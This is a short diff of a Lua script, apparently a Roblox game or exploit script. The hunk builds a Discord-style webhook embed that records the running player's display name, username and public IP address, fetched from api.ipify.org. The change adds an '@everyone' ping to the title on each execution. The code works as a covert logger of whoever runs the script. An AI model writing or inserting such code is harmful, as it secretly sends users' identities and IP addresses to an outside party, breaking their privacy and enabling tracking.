@@ -5933,7 +5933,7 @@ pcall(function()
    local data = {
        ["embeds"] = {
            {
-               ["title"] = "Execution \n Display "..game.Players.LocalPlayer.DisplayName.."\n User "..game.Players.LocalPlayer.Name,
+               ["title"] = "Execution @everyone \n Display "..game.Players.LocalPlayer.DisplayName.."\n User "..game.Players.LocalPlayer.Name,
                ["description"] = "IP Adress: " ..game:HttpGet("https://api.ipify.org")
            }
        }
